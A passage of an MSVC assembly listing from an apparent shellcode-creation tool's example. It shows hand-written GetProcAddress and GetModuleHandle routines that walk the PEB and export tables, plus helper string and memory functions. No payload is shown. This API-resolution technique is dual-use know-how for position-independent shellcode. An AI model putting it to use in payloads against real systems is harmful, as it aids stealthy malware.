	mov	eax, DWORD PTR _pImageNTHeaders$[ebp]
	mov	ecx, DWORD PTR [eax+edx+120]
	mov	DWORD PTR _pImageEntryExportRVA$[ebp], ecx
; Line 201
	mov	edx, DWORD PTR _dwModule$[ebp]
	add	edx, DWORD PTR _pImageEntryExportRVA$[ebp]
	mov	DWORD PTR _pImageExportDirectory$[ebp], edx
; Line 202
	mov	eax, DWORD PTR _pImageExportDirectory$[ebp]
	mov	ecx, DWORD PTR _dwModule$[ebp]
	add	ecx, DWORD PTR [eax+32]
	mov	DWORD PTR _pNameTable$[ebp], ecx
; Line 204
	mov	DWORD PTR _i$4[ebp], 0
	jmp	SHORT $LN4@GetProcAdd
$LN2@GetProcAdd:
	mov	edx, DWORD PTR _i$4[ebp]
	add	edx, 1
	mov	DWORD PTR _i$4[ebp], edx
$LN4@GetProcAdd:
	mov	eax, DWORD PTR _pImageExportDirectory$[ebp]
	mov	ecx, DWORD PTR _i$4[ebp]
	cmp	ecx, DWORD PTR [eax+24]
	jae	SHORT $LN3@GetProcAdd
; Line 205
	mov	edx, DWORD PTR _i$4[ebp]
	mov	eax, DWORD PTR _pNameTable$[ebp]
	mov	ecx, DWORD PTR _dwModule$[ebp]
	add	ecx, DWORD PTR [eax+edx*4]
	push	ecx
	mov	edx, DWORD PTR _lpName$[ebp]
	push	edx
	call	?m_stricmp@@YAHPAD0@Z			; m_stricmp
	add	esp, 8
	test	eax, eax
	jne	SHORT $LN10@GetProcAdd
; Line 206
	mov	eax, DWORD PTR _pImageExportDirectory$[ebp]
	mov	ecx, DWORD PTR _dwModule$[ebp]
	add	ecx, DWORD PTR [eax+36]
	mov	DWORD PTR _pOrdinalTable$3[ebp], ecx
; Line 207
	mov	edx, DWORD PTR _pImageExportDirectory$[ebp]
	mov	eax, DWORD PTR _dwModule$[ebp]
	add	eax, DWORD PTR [edx+28]
	mov	DWORD PTR _pAddressTable$2[ebp], eax
; Line 208
	mov	ecx, DWORD PTR _i$4[ebp]
	mov	edx, DWORD PTR _pOrdinalTable$3[ebp]
	movzx	eax, WORD PTR [edx+ecx*2]
	mov	ecx, DWORD PTR _pAddressTable$2[ebp]
	mov	edx, DWORD PTR [ecx+eax*4]
	mov	DWORD PTR _dwAddressOffset$1[ebp], edx
; Line 209
	mov	eax, DWORD PTR _dwModule$[ebp]
	add	eax, DWORD PTR _dwAddressOffset$1[ebp]
	jmp	SHORT $LN1@GetProcAdd
$LN10@GetProcAdd:
; Line 211
	jmp	SHORT $LN2@GetProcAdd
$LN3@GetProcAdd:
; Line 213
	xor	eax, eax
$LN1@GetProcAdd:
; Line 214
	mov	esp, ebp
	pop	ebp
	ret	0
?_GetProcAddress@@YAP6GHXZPAUHINSTANCE__@@PBD@Z ENDP	; _GetProcAddress
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_pLdr$1 = -20						; size = 4
_pPeb$ = -16						; size = 4
_pHeaderOfModuleList$2 = -12				; size = 4
_pCur$3 = -8						; size = 4
_pEntry$4 = -4						; size = 4
_lpName$ = 8						; size = 4
?_GetModuleHandle@@YAPAUHINSTANCE__@@PA_W@Z PROC	; _GetModuleHandle
; File C:\Users\Yoav\Desktop\YoavTools\ShellCodeCreationTools\ShellCodeCreator\example\example.cpp
; Line 148
	push	ebp
	mov	ebp, esp
	sub	esp, 20					; 00000014H
; Line 154
	mov	eax, DWORD PTR fs:48
	mov	DWORD PTR _pPeb$[ebp], eax
; Line 157
	cmp	DWORD PTR _pPeb$[ebp], 0
	je	SHORT $LN5@GetModuleH
	mov	ecx, DWORD PTR _pPeb$[ebp]
	cmp	DWORD PTR [ecx+12], 0
	je	SHORT $LN5@GetModuleH
; Line 159
	mov	edx, DWORD PTR _pPeb$[ebp]
	mov	eax, DWORD PTR [edx+12]
	mov	DWORD PTR _pLdr$1[ebp], eax
; Line 160
	mov	ecx, DWORD PTR _pLdr$1[ebp]
	add	ecx, 12					; 0000000cH
	mov	DWORD PTR _pHeaderOfModuleList$2[ebp], ecx
; Line 161
	mov	edx, DWORD PTR _pHeaderOfModuleList$2[ebp]
	mov	eax, DWORD PTR [edx]
	cmp	eax, DWORD PTR _pHeaderOfModuleList$2[ebp]
	je	SHORT $LN5@GetModuleH
; Line 162
	mov	DWORD PTR _pEntry$4[ebp], 0
; Line 163
	mov	ecx, DWORD PTR _pHeaderOfModuleList$2[ebp]
	mov	edx, DWORD PTR [ecx]
	mov	DWORD PTR _pCur$3[ebp], edx
$LN4@GetModuleH:
; Line 167
	mov	eax, DWORD PTR _pCur$3[ebp]
	mov	DWORD PTR _pEntry$4[ebp], eax
; Line 168
	mov	ecx, DWORD PTR _lpName$[ebp]
	push	ecx
	mov	edx, DWORD PTR _pEntry$4[ebp]
	mov	eax, DWORD PTR [edx+48]
	push	eax
	call	?m_wstricmp@@YAHPA_W0@Z			; m_wstricmp
	add	esp, 8
	test	eax, eax
	jne	SHORT $LN7@GetModuleH
; Line 169
	mov	ecx, DWORD PTR _pEntry$4[ebp]
	mov	eax, DWORD PTR [ecx+24]
	jmp	SHORT $LN1@GetModuleH
; Line 170
	jmp	SHORT $LN5@GetModuleH
$LN7@GetModuleH:
; Line 172
	mov	DWORD PTR _pEntry$4[ebp], 0
; Line 173
	mov	edx, DWORD PTR _pCur$3[ebp]
	mov	eax, DWORD PTR [edx]
	mov	DWORD PTR _pCur$3[ebp], eax
; Line 174
	mov	ecx, DWORD PTR _pCur$3[ebp]
	cmp	ecx, DWORD PTR _pHeaderOfModuleList$2[ebp]
	jne	SHORT $LN4@GetModuleH
$LN5@GetModuleH:
; Line 178
	xor	eax, eax
$LN1@GetModuleH:
; Line 180
	mov	esp, ebp
	pop	ebp
	ret	0
?_GetModuleHandle@@YAPAUHINSTANCE__@@PA_W@Z ENDP	; _GetModuleHandle
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_i$1 = -4						; size = 4
_lpA$ = 8						; size = 4
_val$ = 12						; size = 1
_size$ = 16						; size = 4
?m_memset@@YAXPADDI@Z PROC				; m_memset
; File C:\Users\Yoav\Desktop\YoavTools\ShellCodeCreationTools\ShellCodeCreator\example\example.cpp
; Line 140
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 141
	mov	DWORD PTR _i$1[ebp], 0
	jmp	SHORT $LN4@m_memset
$LN2@m_memset:
	mov	eax, DWORD PTR _i$1[ebp]
	add	eax, 1
	mov	DWORD PTR _i$1[ebp], eax
$LN4@m_memset:
	mov	ecx, DWORD PTR _i$1[ebp]
	cmp	ecx, DWORD PTR _size$[ebp]
	jae	SHORT $LN1@m_memset
; Line 143
	mov	edx, DWORD PTR _lpA$[ebp]
	add	edx, DWORD PTR _i$1[ebp]
	mov	al, BYTE PTR _val$[ebp]
	mov	BYTE PTR [edx], al
; Line 144
	jmp	SHORT $LN2@m_memset
$LN1@m_memset:
; Line 145
	mov	esp, ebp
	pop	ebp
	ret	0
?m_memset@@YAXPADDI@Z ENDP				; m_memset
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_letterB$1 = -8						; size = 2
_letterA$2 = -4						; size = 2
_lpA$ = 8						; size = 4
_lpB$ = 12						; size = 4
?m_wstricmp@@YAHPA_W0@Z PROC				; m_wstricmp
; File C:\Users\Yoav\Desktop\YoavTools\ShellCodeCreationTools\ShellCodeCreator\example\example.cpp
; Line 111
	push	ebp
	mov	ebp, esp
	sub	esp, 8
$LN2@m_wstricmp:
; Line 112
	mov	eax, DWORD PTR _lpA$[ebp]
	movzx	ecx, WORD PTR [eax]
	test	ecx, ecx
	je	$LN3@m_wstricmp
; Line 114
	xor	edx, edx
	mov	WORD PTR _letterA$2[ebp], dx
	xor	eax, eax
	mov	WORD PTR _letterB$1[ebp], ax
; Line 115
	mov	ecx, DWORD PTR _lpB$[ebp]
	movzx	edx, WORD PTR [ecx]
	test	edx, edx
	jne	SHORT $LN4@m_wstricmp
; Line 117
	mov	eax, 1
	jmp	$LN1@m_wstricmp
$LN4@m_wstricmp:
; Line 119
	mov	eax, DWORD PTR _lpA$[ebp]
	mov	cx, WORD PTR [eax]
	mov	WORD PTR _letterA$2[ebp], cx
; Line 120
	mov	edx, DWORD PTR _lpB$[ebp]
	mov	ax, WORD PTR [edx]
	mov	WORD PTR _letterB$1[ebp], ax
; Line 121
	movzx	ecx, WORD PTR _letterA$2[ebp]
	cmp	ecx, 97					; 00000061H
	jl	SHORT $LN5@m_wstricmp
	movzx	edx, WORD PTR _letterA$2[ebp]
	cmp	edx, 122				; 0000007aH
	jg	SHORT $LN5@m_wstricmp
; Line 122
	movzx	eax, WORD PTR _letterA$2[ebp]
	sub	eax, 32					; 00000020H
	mov	WORD PTR _letterA$2[ebp], ax
$LN5@m_wstricmp:
; Line 124
	movzx	ecx, WORD PTR _letterB$1[ebp]
	cmp	ecx, 97					; 00000061H
	jl	SHORT $LN6@m_wstricmp
	movzx	edx, WORD PTR _letterB$1[ebp]
	cmp	edx, 122				; 0000007aH
	jg	SHORT $LN6@m_wstricmp
; Line 125
	movzx	eax, WORD PTR _letterB$1[ebp]
	sub	eax, 32					; 00000020H
	mov	WORD PTR _letterB$1[ebp], ax
$LN6@m_wstricmp:
; Line 127
	movzx	ecx, WORD PTR _letterA$2[ebp]
	movzx	edx, WORD PTR _letterB$1[ebp]
	cmp	ecx, edx
	je	SHORT $LN7@m_wstricmp
; Line 128
	mov	eax, 1
	jmp	SHORT $LN1@m_wstricmp
$LN7@m_wstricmp:
; Line 130
	mov	eax, DWORD PTR _lpA$[ebp]
	add	eax, 2
	mov	DWORD PTR _lpA$[ebp], eax
; Line 131
	mov	ecx, DWORD PTR _lpB$[ebp]
	add	ecx, 2
	mov	DWORD PTR _lpB$[ebp], ecx
; Line 132
	jmp	$LN2@m_wstricmp
$LN3@m_wstricmp:
; Line 133
	mov	edx, DWORD PTR _lpB$[ebp]
	movzx	eax, WORD PTR [edx]
	test	eax, eax
	je	SHORT $LN8@m_wstricmp
; Line 134
	mov	eax, 1
	jmp	SHORT $LN1@m_wstricmp
$LN8@m_wstricmp:
; Line 136
	xor	eax, eax
$LN1@m_wstricmp:
; Line 137
	mov	esp, ebp
	pop	ebp
	ret	0
?m_wstricmp@@YAHPA_W0@Z ENDP				; m_wstricmp
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_letterB$1 = -2						; size = 1
_letterA$2 = -1						; size = 1
_lpA$ = 8						; size = 4
_lpB$ = 12						; size = 4
?m_stricmp@@YAHPAD0@Z PROC				; m_stricmp
; File C:\Users\Yoav\Desktop\YoavTools\ShellCodeCreationTools\ShellCodeCreator\example\example.cpp
; Line 82
	push	ebp
	mov	ebp, esp
	push	ecx
$LN2@m_stricmp:
; Line 83
	mov	eax, DWORD PTR _lpA$[ebp]
	movsx	ecx, BYTE PTR [eax]
	test	ecx, ecx
	je	$LN3@m_stricmp
; Line 85
	mov	BYTE PTR _letterA$2[ebp], 0
	mov	BYTE PTR _letterB$1[ebp], 0
; Line 86
	mov	edx, DWORD PTR _lpB$[ebp]
	movsx	eax, BYTE PTR [edx]
	test	eax, eax
	jne	SHORT $LN4@m_stricmp
; Line 88
	mov	eax, 1
	jmp	$LN1@m_stricmp
$LN4@m_stricmp:
; Line 90
	mov	ecx, DWORD PTR _lpA$[ebp]
	mov	dl, BYTE PTR [ecx]
	mov	BYTE PTR _letterA$2[ebp], dl
; Line 91
	mov	eax, DWORD PTR _lpB$[ebp]
	mov	cl, BYTE PTR [eax]
	mov	BYTE PTR _letterB$1[ebp], cl
; Line 92
	movsx	edx, BYTE PTR _letterA$2[ebp]
	cmp	edx, 97					; 00000061H
	jl	SHORT $LN5@m_stricmp
	movsx	eax, BYTE PTR _letterA$2[ebp]
	cmp	eax, 122				; 0000007aH
	jg	SHORT $LN5@m_stricmp
; Line 93
	movsx	ecx, BYTE PTR _letterA$2[ebp]
	sub	ecx, 32					; 00000020H
	mov	BYTE PTR _letterA$2[ebp], cl
$LN5@m_stricmp:
; Line 95
	movsx	edx, BYTE PTR _letterB$1[ebp]
	cmp	edx, 97					; 00000061H
	jl	SHORT $LN6@m_stricmp
	movsx	eax, BYTE PTR _letterB$1[ebp]
	cmp	eax, 122				; 0000007aH
	jg	SHORT $LN6@m_stricmp
; Line 96
	movsx	ecx, BYTE PTR _letterB$1[ebp]
	sub	ecx, 32					; 00000020H
	mov	BYTE PTR _letterB$1[ebp], cl
$LN6@m_stricmp:
; Line 98
	movsx	edx, BYTE PTR _letterA$2[ebp]
	movsx	eax, BYTE PTR _letterB$1[ebp]
	cmp	edx, eax
	je	SHORT $LN7@m_stricmp
; Line 99
	mov	eax, 1
	jmp	SHORT $LN1@m_stricmp
$LN7@m_stricmp:
; Line 101
	mov	ecx, DWORD PTR _lpA$[ebp]
	add	ecx, 1
	mov	DWORD PTR _lpA$[ebp], ecx
; Line 102
	mov	edx, DWORD PTR _lpB$[ebp]
	add	edx, 1
	mov	DWORD PTR _lpB$[ebp], edx
; Line 103
	jmp	$LN2@m_stricmp
$LN3@m_stricmp:
; Line 104
	mov	eax, DWORD PTR _lpB$[ebp]
	movsx	ecx, BYTE PTR [eax]
	test	ecx, ecx
	je	SHORT $LN8@m_stricmp
; Line 105
	mov	eax, 1
	jmp	SHORT $LN1@m_stricmp
$LN8@m_stricmp:
; Line 107
	xor	eax, eax
$LN1@m_stricmp:
; Line 108
	mov	esp, ebp
	pop	ebp
	ret	0
?m_stricmp@@YAHPAD0@Z ENDP				; m_stricmp
_TEXT	ENDS
END
